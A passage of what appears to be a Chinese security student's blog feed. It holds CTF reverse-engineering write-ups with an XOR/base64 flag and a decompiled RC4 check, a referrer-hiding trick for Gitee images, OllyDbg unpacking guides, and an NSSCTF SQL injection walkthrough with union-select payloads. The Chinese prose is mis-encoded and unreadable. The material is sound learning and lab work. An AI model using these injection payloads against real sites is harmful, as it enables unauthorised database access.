src="https://gitee.com/fogpost/photo/raw/master/202409141107908.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬èƒ½äº†è§£é‡è¦å‡½æ•°ä¸ºEncodeï¼Œè¿›å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141108814.png" srcset="/img/loading.gif" lazyload><br>äº†è§£äº†è¿™ä¸ªæ˜¯base64åæˆ‘ä»¬è¿˜è¦å’Œæºä»£ç åˆ†æï¼Œå‘ç°å­˜åœ¨ä¸åŒ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141109133.png" srcset="/img/loading.gif" lazyload><br>äº†è§£äº†è¿™ä¸­é—´æœ‰ä¸ªå¼‚æˆ–çš„æ“ä½œï¼Œååˆ†ç®€å•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">do</span><br>&#123;<br>    *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br>    ++v8;<br>&#125;<br><span class="hljs-keyword">while</span> ( v8 != v5 );<br></code></pre></td></tr></table></figure><p>ç›´æ¥cyberChefæ¢è¡¨åŠ å¼‚æˆ–åŒé‡è§£å¯†å®Œæˆï¼Œ<br>è´´ä¸ªæ— å¹¿å‘Šçš„<a href="https://cyberchef.org/">cyberchef</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141116043.png" srcset="/img/loading.gif" lazyload><br>å¾—åˆ°flag<br>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p><h3 id="Ezpy"><a href="#Ezpy" class="headerlink" title="Ezpy"></a>Ezpy</h3><p>é¦–å…ˆå°±æ˜¯æŒ‰ç…§æƒ¯ä¾‹ï¼Œæ–‡ä»¶å±æ€§æŸ¥è¯¢ï¼Œç›´æ¥dieï¼Œä¹Ÿå¯ä»¥ç”¨DEIDæˆ–è€…peexamå»æŸ¥ã€‚ä¸è¿‡dieå¾ˆå…¨é¢ï¼Œä½†æ˜¯ç¡®å®å¾ˆå¡<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151024364.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409151027465.png" srcset="/img/loading.gif" lazyload><br>çœ‹é¢˜ç›®æˆ‘ä»¬å°±çŸ¥é“æ˜¯ä¸€ä¸ªè¿™æ˜¯ä¸€ä¸ªpythoné¢˜ç›®ï¼Œå…¶å®è¿˜æœ‰ä¸€ä¸ªåŠæ³•ï¼Œpythonexeå›¾æ ‡å¤§å¤šéƒ½æ˜¯è¿™ä¸ªï¼Œçœ‹DIEç«Ÿç„¶æ²¡æœ‰æ˜¾ç¤ºæ˜¯ä»€ä¹ˆè½¯ä»¶æ‰“åŒ…çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥è¯•è¯•pyinstxtractor<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151029748.png" srcset="/img/loading.gif" lazyload><br>è¿™å°±æ˜¯è§£åŒ…è¿‡ç¨‹ï¼Œå’Œä½¿ç”¨æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­pyinstxtractorä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå¯¼å‡ºåŒ…ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°è§£åŒ…è½¯ä»¶å¯¹pythonç‰ˆæœ¬çš„éœ€æ±‚ï¼Œä½ æœ‰æƒ³æ³•çš„å¯ä»¥ç”¨<a href="https://zhuanlan.zhihu.com/p/36402791">pyenv</a>å»é™¤æ‰è¿™ä¸ªé”™è¯¯ï¼Œå…¶å®æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä¸»è¦åœ¨äºåé¢pycæ–‡ä»¶ä¸­çš„magic number<br>è¿›å…¥è§£åŒ…æ–‡ä»¶å¤¹ï¼Œä¼šå‘ç°èµ„æºæ–‡ä»¶å¤¹å’Œå¤§é‡çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæˆ‘ä»¬åªå–æ•Œå°†é¦–çº§ï¼Œç›´æ¥çœ‹åˆ°ä¸€ä¸ªæ²¡æœ‰åç¼€çš„é¢˜ç›®åŒåè½¯ä»¶Ezpy<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151035853.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªå…¶å®æ˜¯pycä¹Ÿå°±æ˜¯pythonçš„å­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦çš„å°±æ˜¯è¿™ä¸ªï¼Œpythonå¤§éƒ¨åˆ†å°±æ˜¯åˆ©ç”¨pycæ¥è¿›è¡Œåç¼–è¯‘ï¼Œæˆ‘ä»¬æ‰€çŸ¥çš„åç¼–è¯‘å·¥å…·æœ‰<a href="https://www.52pojie.cn/thread-1854345-1-1.html">pycdc</a>(pycdcä¼šæœ‰äº›éº»çƒ¦ï¼Œä¸è¿‡æ„Ÿè§‰å¼ºå¤§äº›ï¼Œå› ä¸ºæ˜¯åç¼–è¯‘éš¾å…ä¼šå‡ºç°é”™è¯¯ï¼Œè€Œè¿™ä¸ªçš„é”™è¯¯å‡ºç°ä¼šæ›´åŠ ç¨€å°‘)å’Œ<a href="https://pypi.com.cn/project/uncompyle6/">uncompyle6</a>è¿™ä¸ªçš„å®‰è£…éå¸¸çš„ç®€å•ï¼Œæœ‰pythonå°±è¡Œ(ä½†æ˜¯åªæ”¯æŒ3.8åŠä¸€ä¸‹çš„ï¼Œä½œè€…å¤§å¤§ä¸æ›´3.9äº†)<br>å¥½ç°åœ¨æˆ‘ä»¬å¼€å§‹æ‰§è¡Œä¸€ä¸‹pycdc(è®°å¾—æ”¹Ezpyåç¼€åï¼Œpycdcå°±æ²¡å…³ç³»)ï¼Œå°±ä¼šå‘ç°æƒŠå–œäº†ï¼Œå¤±è´¥äº†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151042742.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªå°±æ˜¯æˆ‘è¯´çš„magicnumberçš„é—®é¢˜è§£å†³åŠæ³•ä¹Ÿéå¸¸ç®€å•ï¼Œä¸€èˆ¬è§£åŒ…åéƒ½ä¼šè‡ªå¸¦ä¸€ä¸ªstructæ–‡ä»¶ã€‚ç”¨å­—èŠ‚æŸ¥çœ‹å™¨æ‰“å¼€æ¨è<a href="https://www.52pojie.cn/thread-1863194-1-1.html">010</a>ï¼Œä¸è¿‡å¤§éƒ¨åˆ†éƒ½æ˜¯æŸåçš„æˆ‘åœ¨è¿™è´´ä¸€ä¸ª<a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">magicnumber</a>ã€‚<br>æ³¨æ„å¤§å°ç«¯åºï¼Œç…§ç€æ”¹å°±è¡Œã€‚å»ºè®®æ˜¯åå…­ä¸ªå­—èŠ‚ï¼Œç•™ç©ºç•™ä¸‹æ ˆåŒº<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151053398.png" srcset="/img/loading.gif" lazyload><br>ç„¶åç›´æ¥åç¼–è¯‘(ä¹Ÿå¯ä»¥ç”¨ç½‘ç»œç‰ˆçš„)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_Sbox</span>(<span class="hljs-params">seed</span>):<br>    k_b = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ <span class="hljs-built_in">ord</span>(seed[i % <span class="hljs-built_in">len</span>(seed)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k_b[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyStream</span>(<span class="hljs-params">text, Sbox</span>):<br>    s = Sbox.copy()<br>    (i, j) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    k = [<br>        <span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(text)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        k[r] = s[t] ^ Key.keykey[r % <span class="hljs-built_in">len</span>(Key.keykey)]<br>    <span class="hljs-keyword">return</span> k<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">text, seed</span>):<br>    Sbox = init_Sbox(seed)<br>    key = KeyStream(text, Sbox)<br>    enc = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ text[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br>enc = <span class="hljs-string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input Your flag:&#x27;</span>)<br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(flag)<br>flag = Encrypt(flag, Key.key)<br><span class="hljs-keyword">if</span> flag != enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s not flag!&quot;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are right!&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„rc4<br>ç›´æ¥ç»™å‡ºexp</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯æ¶çš„giteeåƒæ‰å¤–é“¾äº†</title>
    <link href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/"/>
    <url>/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/</url>
    
    <content type="html"><![CDATA[<h3 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h3><p>è¿™æ˜¯è¿™ä¸ªåšå®¢æœ€å¼€å§‹çš„æ•…äº‹ï¼Œæˆ‘æƒ³è¦ç”¨giteeåšä¸€ä¸ªå›¾åºŠï¼Œå½“æ—¶æˆ‘æ€ä¹ˆä¹Ÿæ²¡æƒ³åˆ°giteeå±…ç„¶æ‹’ç»æ‰å¤–é“¾çš„è¯·æ±‚äº†ï¼Œå°±åƒè¿™æ ·<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>ä½†æ˜¯åå¤å°è¯•æˆ‘ä»¬å‘ç°äº†ä¸€ä¸‹è¿”å›å€¼</p><h3 id="é˜²ç›—é“¾"><a href="#é˜²ç›—é“¾" class="headerlink" title="é˜²ç›—é“¾"></a>é˜²ç›—é“¾</h3><p>è¦å®ç°é˜²ç›—é“¾ï¼Œå°±éœ€è¦çŸ¥é“å›¾ç‰‡çš„è¯·æ±‚æ˜¯ä»å“ªé‡Œå‘å‡ºçš„ã€‚å¯ä»¥å®ç°è¿™ä¸€åŠŸèƒ½çš„æœ‰è¯·æ±‚å¤´ä¸­çš„originå’Œrefererã€‚originåªæœ‰åœ¨XHRè¯·æ±‚ä¸­æ‰ä¼šå¸¦ä¸Šï¼Œæ‰€ä»¥å›¾ç‰‡èµ„æºåªèƒ½å€ŸåŠ©referer</p><p>é€šè¿‡åˆ¤æ–­è¯·æ±‚çš„refererï¼Œå¦‚æœè¯·æ±‚æ¥æºä¸æ˜¯æœ¬ç«™å°±è¿”å›302</p><h4 id="ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š"><a href="#ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š" class="headerlink" title="ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š"></a>ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š</h4><ul><li>é¦–å…ˆè¯·æ±‚æ­£å¸¸çš„å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›200ï¼Œè€Œæ˜¯302é‡å®šå‘ï¼Œå…¶ä¸­å“åº”å¤´ä¸­çš„locationå°±æ˜¯è¦é‡å®šå‘å»å‘çš„åœ°å€</li><li>æ¥ç€æµè§ˆå™¨ä¼šè‡ªåŠ¨è¯·æ±‚è¿™ä¸ªlocationï¼Œå¹¶ç”¨è¿™ä¸ªè¿”å›ç»“æœä»£æ›¿ç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¿”å›å†…å®¹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="å¦‚ä½•ç ´è§£é˜²ç›—é“¾"><a href="#å¦‚ä½•ç ´è§£é˜²ç›—é“¾" class="headerlink" title="å¦‚ä½•ç ´è§£é˜²ç›—é“¾"></a>å¦‚ä½•ç ´è§£é˜²ç›—é“¾</h4><p>æƒ³è®©giteeä¸çŸ¥é“æˆ‘åœ¨ç›—ç”¨ï¼Œå°±ä¸èƒ½è®©ä»–å‘ç°è¯·æ±‚çš„æ¥æºæ˜¯ç¬¬ä¸‰æ–¹ï¼Œåªè¦æŠŠrefererè—èµ·æ¥å°±å¥½</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥éª—è¿‡giteeï¼Œç”¨butterflyå’Œyiliaçš„ä¸»é¢˜å¯ä»¥ä¸Šç½‘æœæœéƒ½æœ‰è®²ï¼Œfluidè¿™ç±»çš„ä¸åŒï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè¦è®²ä¸‹è¿›é˜¶çš„ä»£ç æ³¨å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>æŒ‰ä¸Šé¢è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºheaderå¤´å‰çš„ä»£ç æ¥æ³¨å…¥ï¼Œéª—è¿‡giteeä½¿å›¾ç‰‡æ˜¾ç°<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122236132.png" srcset="/img/loading.gif" lazyload><br>ä¸‹é¢æ˜¯æˆ‘çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ³¨è§£ï¼š</p><meta name="referrer" content="no-referrer" /> æŒ‡å®šäº† "no-referrer" çš„å†…å®¹ï¼Œæ„å‘³ç€æµè§ˆå™¨åœ¨å‘é€è¯·æ±‚æ—¶ä¸ä¼šåŒ…å«ä»»ä½•å¼•ç”¨æ¥æºä¿¡æ¯ã€‚æ¢å¥è¯è¯´ï¼Œå½“ç”¨æˆ·ä»å½“å‰ç½‘é¡µè·³è½¬åˆ°å…¶ä»–é¡µé¢æ—¶ï¼Œæ–°é¡µé¢æ¥æ”¶åˆ°çš„è¯·æ±‚ä¸­å°†ä¸åŒ…å«è¿™ä¸ªè·³è½¬å‰çš„é¡µé¢åœ°å€<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤</title>
    <link href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/FSG%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h3 id="MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤"><a href="#MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤" class="headerlink" title="MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤"></a>MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤</h3><p>è¿›è¡Œæ‰‹åŠ¨æŸ¥æ‰¾å’ŒIATä¿®å¤<br>æ‰¾å¯ä»¥åœ¨åŠ¨æ€è¿æ¥åº“ä¸­æŸ¥å¾—åˆ°çš„call<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016001.png"><br>åœ¨å‘½ä»¤è¡Œä¸­æ•²425210ç„¶åæŸ¥è¿æ¥åº“å‡½æ•°<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016599.png"><br>å‘ä¸Šå‘ä¸‹æŸ¥æ‰¾ä¸º0çš„æ•°å€¼(åˆ†å‰²å¤„)<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016253.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016865.png"><br>æ‰‹åŠ¨ä¿®æ”¹RVAå’Œsizeçš„å€¼<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016959.png"></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aspè„±å£³</title>
    <link href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/asp%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>aspè„±å£³æ—¶åˆ©ç”¨</p><h4 id="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"><a href="#æ¨¡æ‹Ÿè·Ÿè¸ªæ³•" class="headerlink" title="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"></a>æ¨¡æ‹Ÿè·Ÿè¸ªæ³•</h4><p>åˆ©ç”¨tcå‘½ä»¤è·Ÿè¸ª<br><img src="http://gitee.com/fogpost/photo/raw/master/image12.png" srcset="/img/loading.gif" lazyload><br>æŸ¥æ‰¾å¸¦æœ‰sfxå’Œè¾“å…¥è¡¨çš„å­—æ®µ<br><img src="http://gitee.com/fogpost/photo/raw/master/image-1.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªæ–¹æ³•ç”±äºæ—¶ç¨‹åºè‡ªåŠ¨è¿›è¡Œçš„æ‰€ä»¥ååˆ†ç¼“æ…¢ä¸å»ºè®®ç”¨  </p><h4 id="SFXæ³•"><a href="#SFXæ³•" class="headerlink" title="SFXæ³•"></a>SFXæ³•</h4><p><img src="http://gitee.com/fogpost/photo/raw/master/image-3.png" srcset="/img/loading.gif" lazyload><br>è‡ªåŠ¨æŠµè¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/image-4.png" srcset="/img/loading.gif" lazyload></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>å·§å¦™è„±å£³æ³•<br><img src="http://gitee.com/fogpost/photo/raw/master/image-5.png" srcset="/img/loading.gif" lazyload><br>at GetVersion  </p><p>ä¸‹ç‰ˆæœ¬æ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/image-6.png" srcset="/img/loading.gif" lazyload><br>åœ¨retnå¤„ä¸‹æ–­ç‚¹<br>å•æ­¥F8ä¹‹ååˆ°æ‰“OEPä¹‹åå‘å‰æ‰¾OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122015500.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEcompactè„±å£³</title>
    <link href="/2024/09/12/PEcompact/"/>
    <url>/2024/09/12/PEcompact/</url>
    
    <content type="html"><![CDATA[<h3 id="PEcompactè„±å£³"><a href="#PEcompactè„±å£³" class="headerlink" title="PEcompactè„±å£³"></a>PEcompactè„±å£³</h3><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017434.png"></p><blockquote><p>3<br>BP VirtualFree<br>F9åˆ°è¾¾å–æ¶ˆæ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017793.png"><br>è¿”å›åˆ°ç”¨æˆ·ä»£ç alt+f9<br>æŸ¥æ‰¾PUSH 8000<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017787.png"><br>ç„¶åå•æ­¥åˆ°è¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017628.png"></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>ä¸¤æ¬¡shift+f9åˆ°è¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017209.png"><br>è¿”å›åˆ°ç”¨æˆ·ä»£ç alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017851.png"><br>ç„¶åå•æ­¥è·Ÿè¸ªåˆ°è¾¾oep</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017705.png"></p><blockquote><p>5<br>bp 0045DE74<br>è¿è¡Œ,åˆ°è¾¾åå–æ¶ˆæ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018701.png"><br>åœ¨retnå¤„ä¼šè¿”å›å¹¶æ‰§è¡Œç¨‹åºæˆ‘ä»¬ç°åœ¨ä¸‹é¢ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åå•æ­¥åˆ°OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018935.png"><br>è¿™ä¸€æ®µæ±‡ç¼–æ¯”è¾ƒé‡è¦æ³¨æ„åœ¨retnåé¢åŠ ä¸Šæ–­ç‚¹</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018816.png"></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,å–æ¶ˆæ–­ç‚¹,è¿”å›ç”¨æˆ·ä»£ç alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018918.png"><br>æŸ¥æ‰¾jump<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018029.png"><br>å•æ­¥åˆ°OEP</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018091.png"></p><blockquote><p>7  å–æ¶ˆå¼‚å¸¸<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018128.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br>åˆ©ç”¨shift+f9,ä¸¤æ¬¡è¿‡åå‘ç°è·‘é£ï¼Œåˆ©ç”¨ç¬¬äºŒæ¬¡çš„SEå¥æŸ„åœ°å€ï¼Œï¼ˆå¦‚æœå‘ç°å•è¯å°±è·‘é£äº†é‚£æ˜¯åº”ä¸ºå¾çˆ±ç ´è§£odä¸­çš„æ’ä»¶strongodçš„è¿‡åœ¨optionä¸­å°†skip some Exceptionå–æ¶ˆå°±è¡Œï¼‰<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019809.png"><br>æŸ¥æ‰¾å¥æŸ„<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019805.png"></p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122019946.png"></p><blockquote><p>8  ä¸¤æ¬¡å†…å­˜<br>æ³¨æ„å¯¹æ¯”è·³è·ƒä»£ç <br>9  at Getversion<br>åˆ°è¾¾OEPçš„ä¸‹æ–¹</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sqlæ³¨å…¥åˆè¯†</title>
    <link href="/2024/09/12/sql%E5%88%9D%E8%AF%95/"/>
    <url>/2024/09/12/sql%E5%88%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqlæ³¨å…¥åˆè¯†"><a href="#Sqlæ³¨å…¥åˆè¯†" class="headerlink" title="Sqlæ³¨å…¥åˆè¯†"></a>Sqlæ³¨å…¥åˆè¯†</h1><p>&nbsp;&nbsp;æˆ‘ä»¬é¦–å…ˆäº†è§£sqlæ³¨å…¥å°±æ˜¯åœ¨sqlæ•°æ®åº“è¯­å¥æ‰§è¡Œçš„æ—¶å€™è·³è¿‡æ­£ç¡®çš„æ‰§è¡Œæ¥è¿›è¡Œæˆ‘ä»¬çš„è¯­å¥è¾¾åˆ°æƒé™è·³è¿‡ç›´æ¥è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œ<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png"><br>ä»¥nssctfé¢˜ä¸ºä¾‹<br>é¦–å…ˆåœ¨äº†è§£äº†å¯ä»¥åˆ©ç”¨ä¸‡èƒ½å¯†ç 1â€™è¿›è¡Œå›æ˜¾ä¹‹åæˆ‘ä»¬åˆ©ç”¨sqlè¯­å¥è¿›è¡Œåº“çš„æŸ¥çœ‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šå‡ åˆ—ä¹‹åä¾¿å¯ä»¥ç”¨è¯­å¥æŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png"><br>ä¾¿å¯ä»¥äº†è§£ç¬¬äºŒåˆ—å’Œç¬¬ä¸‰åˆ—çš„ç±»å‹<br>ç„¶åè¾“å…¥ä¸€ä¸‹è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“åç§°ï¼Œä»¥åŠåº“ä¸­æœ‰ä»€ä¹ˆè¡¨ï¼Œ<br>å¹¶æŸ¥è¯¢ä¸¤å¼ è¡¨ä¸­çš„å­—æ®µï¼Œå‘ç°flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span 